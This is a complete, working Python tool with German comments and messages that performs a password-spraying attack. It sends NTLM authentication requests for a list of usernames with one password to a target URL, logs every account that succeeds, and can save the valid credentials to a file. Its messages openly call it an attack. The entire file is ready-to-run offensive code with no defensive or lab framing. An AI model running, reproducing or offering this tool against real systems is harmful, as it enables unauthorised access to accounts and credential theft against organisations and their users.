#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys
import getopt
import datetime
import os

class NTLMSprayer:
    def __init__(self, fqdn, output_file=None, verbose=True):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = verbose
        self.fqdn = fqdn
        self.output_file = output_file
        self.valid_credentials = []

    def load_users(self, userfile):
        """Lädt Benutzernamen aus einer Datei"""
        try:
            with open(userfile, 'r') as f:
                self.users = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Fehler: Die Datei '{userfile}' wurde nicht gefunden.")
            sys.exit(1)

    def log_result(self, message):
        """Optional: Ergebnis in Ausgabedatei schreiben"""
        if self.output_file:
            with open(self.output_file, 'a') as f:
                f.write(message + "\n")

    def password_spray(self, password, url):
        """Führt die Password-Spray-Attacke durch"""
        print(f"\n[*] Starte Password-Spray-Angriff mit Passwort: '{password}'\n")
        count = 0
        for user in self.users:
            try:
                response = requests.get(url, auth=HttpNtlmAuth(f"{self.fqdn}\\{user}", password), timeout=10)
            except requests.RequestException as e:
                print(f"[!] Netzwerkfehler bei Benutzer {user}: {e}")
                continue

            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                msg = f"[+] Erfolgreich: {user} : {password}"
                print(msg)
                self.log_result(msg)
                self.valid_credentials.append((user, password))
                count += 1
            elif self.verbose and response.status_code == self.HTTP_AUTH_FAILED_CODE:
                print(f"[-] Fehlgeschlagen: {user}")
            elif self.verbose:
                print(f"[!] Unerwarteter Statuscode ({response.status_code}) für Benutzer {user}")
        print(f"\n[*] Angriff abgeschlossen – {count} gültige Zugangsdaten gefunden.\n")
        if self.output_file:
            print(f"[*] Ergebnisse gespeichert in: {self.output_file}")

def print_usage():
    """Ausgabehilfe für das Script"""
    usage = (
        "\nVerwendung:\n"
        "  ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <url> [-o <outputfile>] [-q]\n\n"
        "Optionen:\n"
        "  -u, --userfile     Pfad zur Datei mit Benutzernamen\n"
        "  -f, --fqdn         FQDN (z. B. za.domain.local)\n"
        "  -p, --password     Zu testendes Passwort\n"
        "  -a, --attackurl    URL der NTLM-geschützten Ressource\n"
        "  -o, --output       (Optional) Datei zur Speicherung gültiger Logins\n"
        "  -q, --quiet        Keine Ausgaben bei Fehlversuchen\n"
        "  -h, --help         Diese Hilfe anzeigen\n"
    )
    print(usage)

def main(argv):
    userfile = fqdn = password = attackurl = output_file = ""
    verbose = True

    try:
        opts, _ = getopt.getopt(argv, "hu:f:p:a:o:q", [
            "help", "userfile=", "fqdn=", "password=", "attackurl=", "output=", "quiet"
        ])
    except getopt.GetoptError:
        print_usage()
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print_usage()
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = arg
        elif opt in ("-f", "--fqdn"):
            fqdn = arg
        elif opt in ("-p", "--password"):
            password = arg
        elif opt in ("-a", "--attackurl"):
            attackurl = arg
        elif opt in ("-o", "--output"):
            output_file = arg
        elif opt in ("-q", "--quiet"):
            verbose = False

    if all([userfile, fqdn, password, attackurl]):
        # Ergebnisdatei vorbereiten
        if output_file:
            with open(output_file, 'w') as f:
                f.write(f"# Password-Spray-Ergebnisse – {datetime.datetime.now()}\n")

        # Angriff starten
        sprayer = NTLMSprayer(fqdn, output_file=output_file, verbose=verbose)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
    else:
        print("[!] Fehler: Alle Pflichtparameter müssen angegeben werden.\n")
        print_usage()
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])
